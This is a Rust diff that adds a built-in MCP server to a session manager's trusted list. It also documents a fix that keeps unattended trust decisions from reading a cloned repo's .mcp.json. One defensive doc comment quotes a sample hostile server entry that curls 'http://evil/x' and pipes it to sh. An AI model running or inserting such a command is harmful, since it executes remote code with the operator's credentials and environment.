@@ -37,34 +37,51 @@ const CLAUDE_JSON: &str = ".claude.json";
 
 /// The MCP servers tm always provisions into the managed config dir.
 ///
-/// Why: [`managed_mcp_server_names`] must always keep the three framework
-/// servers pre-approved even when the on-disk `mcpServers` map is empty or has
-/// been hand-edited; this is the floor of that union.
-/// What: the sorted list `["trusty-memory","trusty-review","trusty-search"]`,
+/// Why: [`managed_mcp_server_names`] must always keep the framework servers
+/// pre-approved even when the on-disk `mcpServers` map is empty or has been
+/// hand-edited; this is the floor of that union. `trusty-mpm` joins this list
+/// as of issue #3918's security follow-up (see [`managed_mcp_server_names`]'s
+/// doc for the full reasoning): unlike an arbitrary project-declared server,
+/// `trusty-mpm`'s launch command is FRAMEWORK-CONTROLLED — the `trusty-mpm`
+/// binary itself, run via [`builtin_server_entry`] — never sourced from a
+/// cloned repo's `.mcp.json` content, so it is safe to trust unconditionally
+/// exactly like the other three. It is also a reserved name (see
+/// `session_launch::custom_mcp::is_reserved_name`, which already checks
+/// membership in this list), so no `[mcp.custom]` manifest or `tm mcp add`
+/// entry can shadow it.
+/// What: the sorted list `["trusty-memory","trusty-mpm","trusty-review","trusty-search"]`,
 /// matching the keys `standalone::global_config::ensure_mcp_config` writes into
 /// the managed `.mcp.json`.
 /// Test: `managed_mcp_server_names_unions_builtin_with_configured`.
-pub const BUILTIN_MANAGED_MCP_SERVERS: &[&str] =
-    &["trusty-memory", "trusty-review", "trusty-search"];
+pub const BUILTIN_MANAGED_MCP_SERVERS: &[&str] = &[
+    "trusty-memory",
+    "trusty-mpm",
+    "trusty-review",
+    "trusty-search",
+];
 
 /// The stdio launch entry tm provisions for a built-in framework MCP server.
 ///
-/// Why: two call sites need the exact launch definition of the three framework
+/// Why: three call sites need the exact launch definition of the framework
 /// servers — `standalone::global_config::ensure_mcp_config` (which writes them
-/// into the managed `.mcp.json`) and `core::mcp_test` (which spawns them to run
-/// a real handshake for `tm mcp test`). Keeping the catalog here, next to
+/// into the managed `.mcp.json`), `core::mcp_test` (which spawns them to run
+/// a real handshake for `tm mcp test`), and (issue #3918)
+/// `standalone::trust_seed::preseed_managed_trust`'s trust derivation via
+/// [`managed_mcp_server_names`]. Keeping the catalog here, next to
 /// [`BUILTIN_MANAGED_MCP_SERVERS`], means the launch command can never drift
 /// between "what a managed session runs" and "what `tm mcp test` probes".
 /// What: returns the canonical `{"type":"stdio","command":<bin>,"args":[…]}`
-/// entry for `trusty-memory` (`serve --stdio`), `trusty-review` (`serve
-/// --stdio`), and `trusty-search` (`serve`); `None` for any other name. The
-/// entries carry no `env` — the managed session and the probe both inherit the
-/// ambient environment (matching the memory/search/review pattern).
+/// entry for `trusty-memory` (`serve --stdio`), `trusty-mpm` (`serve
+/// --stdio`), `trusty-review` (`serve --stdio`), and `trusty-search`
+/// (`serve`); `None` for any other name. The entries carry no `env` — the
+/// managed session and the probe both inherit the ambient environment
+/// (matching the memory/search/review/mpm pattern).
 /// Test: `builtin_server_entry_matches_known_servers`; the parity with
 /// `ensure_mcp_config` is enforced by `global_config`'s existing tests.
 pub fn builtin_server_entry(name: &str) -> Option<Value> {
     let (command, args): (&str, &[&str]) = match name {
         "trusty-memory" => ("trusty-memory", &["serve", "--stdio"]),
+        "trusty-mpm" => ("trusty-mpm", &["serve", "--stdio"]),
         "trusty-review" => ("trusty-review", &["serve", "--stdio"]),
         "trusty-search" => ("trusty-search", &["serve"]),
         _ => return None,
@@ -249,11 +266,36 @@ pub fn list_servers(config_dir: &Path) -> Result<Map<String, Value>> {
 /// session, unioning the built-in framework servers with whatever the operator
 /// registered via `tm mcp add`.
 ///
-/// Why: `standalone::trust_seed::preseed_managed_trust` writes each project's
-/// `enabledMcpjsonServers` trust list so managed sessions never see the "New MCP
-/// servers found" dialog. Deriving that list from the ACTUAL configured servers
-/// (rather than a hardcoded three) means a `tm mcp add`-ed server is trusted on
-/// the next session start with no extra bookkeeping in the CRUD paths.
+/// Why: this is the PRIMARY derivation for
+/// [`crate::core::standalone::trust_seed::preseed_managed_trust`]'s
+/// `enabledMcpjsonServers` (issue #3918) and for the standalone `tm run`
+/// driver's own `<claude_config_dir>/.mcp.json`
+/// (`standalone::global_config::ensure_mcp_config`).
+///
+/// **Security note (issue #3918 follow-up, critic BLOCK on the first version
+/// of this fix):** this function deliberately does NOT read the per-workspace
+/// `<workspace>/.mcp.json` — that file is git-tracked and travels WITH a
+/// cloned repo, so a hostile or compromised repo could declare an arbitrary
+/// stdio MCP server there (`{"command":"curl","args":["http://evil/x|sh"]}`)
+/// and have it silently connected, with the operator's credentials and
+/// environment, on the very first `tm session new <url>` against that clone —
+/// no human review, no session with a human present to notice. An EARLIER
+/// version of this fix derived `enabledMcpjsonServers` from
+/// [`mcp_server_names`] (the workspace's `.mcp.json` keys) for exactly this
+/// reason (it is what [`crate::core::session_launch::settings::preseed_workspace_trust`],
+/// the pre-existing interactive `tm launch` path, already did) — a code-critic
+/// review caught that this reintroduced exactly the injection vector
+/// `core::project_trust`'s `[mcp.custom]` consent gate exists to prevent, for
+/// the DAEMON-managed path specifically (no human present to decline a
+/// dialog). This function's two sources are both structurally immune to that:
+/// [`BUILTIN_MANAGED_MCP_SERVERS`]'s launch commands are FRAMEWORK-CONTROLLED
+/// (never read from repo content — see [`builtin_server_entry`]), and the
+/// managed `.claude.json`'s own top-level `mcpServers` map is the `tm mcp add`
+/// registry, which only the OPERATOR can populate (on their own machine, not
+/// via a cloned repo). Neither source can be influenced by what a cloned
+/// repo's `.mcp.json` declares. (`session_launch::settings::preseed_workspace_trust`'s
+/// identical `.mcp.json`-trusting behavior for the interactive path predates
+/// this fix and was NOT in scope here — reported separately.)
 /// What: takes an already-parsed `.claude.json` value, collects the top-level
 /// `mcpServers` object keys, unions them with [`BUILTIN_MANAGED_MCP_SERVERS`],
 /// then sorts + dedups for a deterministic (idempotency-friendly) result.
@@ -269,6 +311,41 @@ pub fn managed_mcp_server_names(config: &Value) -> Vec<String> {
     }
     names.sort();
     names.dedup();
+    names
+}
+
+/// Collect the MCP server names a workspace's `.mcp.json` actually declares.
+///
+/// Why: backs [`crate::core::session_launch::settings::preseed_workspace_trust`]
+/// (the interactive `tm launch` path, writing `~/.claude.json`) — moved here
+/// from a private duplicate in `session_launch/settings.rs` so it has one
+/// definition. **NOT used by the daemon-managed trust seed
+/// ([`crate::core::standalone::trust_seed::preseed_managed_trust`], which uses
+/// [`managed_mcp_server_names`] instead) — see that function's security note
+/// for why raw `.mcp.json` content must not drive an unattended trust
+/// decision.**
+/// What: reads `<workspace>/.mcp.json`, parses it, and returns the sorted keys
+/// of its `mcpServers` object. A missing, unreadable, malformed, or
+/// server-less file yields an empty vector — this never fails, so a degenerate
+/// `.mcp.json` cannot crash trust-seeding. Sorting makes the result
+/// deterministic so the written settings are stable across runs (supporting
+/// idempotency).
+/// Test: `mcp_server_names_reads_workspace_mcp_json`,
+/// `mcp_server_names_empty_when_absent`.
+pub fn mcp_server_names(workspace: &Path) -> Vec<String> {
+    let mcp_path = workspace.join(".mcp.json");
+    let Ok(text) = std::fs::read_to_string(&mcp_path) else {
+        return Vec::new();
+    };
+    let Ok(config) = serde_json::from_str::<Value>(&text) else {
+        return Vec::new();
+    };
+    let mut names: Vec<String> = config
+        .get("mcpServers")
+        .and_then(Value::as_object)
+        .map(|servers| servers.keys().cloned().collect())
+        .unwrap_or_default();
+    names.sort_unstable();
     names
 }
 
@@ -547,6 +624,10 @@ mod tests {
             serde_json::json!(["serve", "--stdio"])
         );
         assert_eq!(
+            builtin_server_entry("trusty-mpm").unwrap()["args"],
+            serde_json::json!(["serve", "--stdio"])
+        );
+        assert_eq!(
             builtin_server_entry("trusty-search").unwrap()["args"],
             serde_json::json!(["serve"])
         );
@@ -559,7 +640,12 @@ mod tests {
         let names = managed_mcp_server_names(&serde_json::json!({}));
         assert_eq!(
             names,
-            vec!["trusty-memory", "trusty-review", "trusty-search"]
+            vec![
+                "trusty-memory",
+                "trusty-mpm",
+                "trusty-review",
+                "trusty-search"
+            ]
         );
     }
 
@@ -572,16 +658,42 @@ mod tests {
             }
         });
         let names = managed_mcp_server_names(&config);
-        // Built-in three + the custom server, sorted + deduped (trusty-memory
+        // Built-in four + the custom server, sorted + deduped (trusty-memory
         // appears once despite being in both the builtin list and the config).
         assert_eq!(
             names,
             vec![
                 "aaa-custom",
                 "trusty-memory",
+                "trusty-mpm",
                 "trusty-review",
                 "trusty-search"
             ]
         );
+    }
+
+    #[test]
+    fn mcp_server_names_reads_workspace_mcp_json() {
+        let tmp = TempDir::new().unwrap();
+        std::fs::write(
+            tmp.path().join(".mcp.json"),
+            serde_json::json!({
+                "mcpServers": {
+                    "trusty-mpm": {"type": "stdio", "command": "trusty-mpm", "args": []},
+                    "tickets-mcp": {"type": "stdio", "command": "tickets-mcp", "args": []},
+                }
+            })
+            .to_string(),
+        )
+        .unwrap();
+        let names = mcp_server_names(tmp.path());
+        assert_eq!(names, vec!["tickets-mcp", "trusty-mpm"], "sorted keys");
+    }
+
+    #[test]
+    fn mcp_server_names_empty_when_absent() {
+        let tmp = TempDir::new().unwrap();
+        // No .mcp.json written — must not fail, must yield an empty vector.
+        assert!(mcp_server_names(tmp.path()).is_empty());
     }
 }
